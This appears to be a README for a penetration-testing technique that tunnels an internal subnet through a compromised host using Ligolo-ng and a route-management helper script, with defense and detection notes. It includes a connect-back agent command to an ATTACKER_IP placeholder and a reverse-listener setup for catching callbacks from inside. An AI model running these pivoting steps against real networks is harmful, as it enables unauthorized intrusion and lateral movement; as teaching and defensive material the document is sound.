# Ligolo-ng pivoting (+ ligoloctl)

Full writeup: [jperezduerto.info/techniques/ligolo-ng-pivoting](https://jperezduerto.info/techniques/ligolo-ng-pivoting/)

Ligolo-ng routes an internal subnet through a compromised host at layer 3, to a
TUN interface on your attack box, so every tool works unchanged (no proxychains,
no per-port SOCKS). A proxy runs on your box; an agent on the pivot connects back
over TLS; you add a route for the target subnet to the `ligolo` interface.
`ligoloctl.py` manages the attack-box plumbing (TUN + routes + clean teardown);
the proxy and agent are ligolo-ng's own binaries.

## Setup

```bash
# attack box
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert                                   # :11601

# pivot (match OS/arch; reverse connection)
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

In the proxy console: `session` (pick agent), `ifconfig`, `start`. Then route
the subnet: `sudo ip route add 172.16.1.0/24 dev ligolo`. Recent ligolo has
`autoroute` to do the TUN+routes for you.

**Route the network address, not a guessed /24.** `172.16.5.129/23` spans
`172.16.4.0-172.16.5.255`, so the route is `172.16.4.0/23`. Wrong mask = a route
that matches nothing and a pivot that looks dead.

Reverse listener (catch a callback from inside):
`listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp`.

## ligoloctl

Dependency-free (Python 3 stdlib), Linux only, uses sudo automatically. It
normalizes each CIDR to its network address so the gotcha above cannot bite, and
tracks what it added so `cleanup` removes exactly that.

```bash
sudo python3 ligoloctl.py up               # create + bring up the ligolo tun
python3 ligoloctl.py add 172.16.1.0/24     # route a subnet (normalized)
python3 ligoloctl.py add 172.16.5.129/23   # -> normalized to 172.16.4.0/23
python3 ligoloctl.py list                  # tun + inventory + kernel routes
python3 ligoloctl.py del 172.16.1.0/24
python3 ligoloctl.py cleanup               # remove every route we added, then the tun
python3 ligoloctl.py --selftest
```

State in `~/.ligolo/routes.json`.

## Defense

Control egress (the agent must dial home; default-deny outbound from server
segments kills it); application control / EDR for the unsigned agent binary;
segment so a pivot reaches few subnets; watch east-west fan-out (the pivot
originates the routed traffic).

## Detection

Outbound TLS from a server to an unexpected external host (self-signed cert, odd
port, default 11601); a new unsigned binary from a writable path; one internal
host connecting across a subnet it has no reason to; ligolo's default cert
fingerprint; a reverse listener on the agent.

## Use

Authorized and educational use only: your own lab, a network you own, or an
engagement with written permission. Route only networks you are authorized to
reach, and run `cleanup` when done.
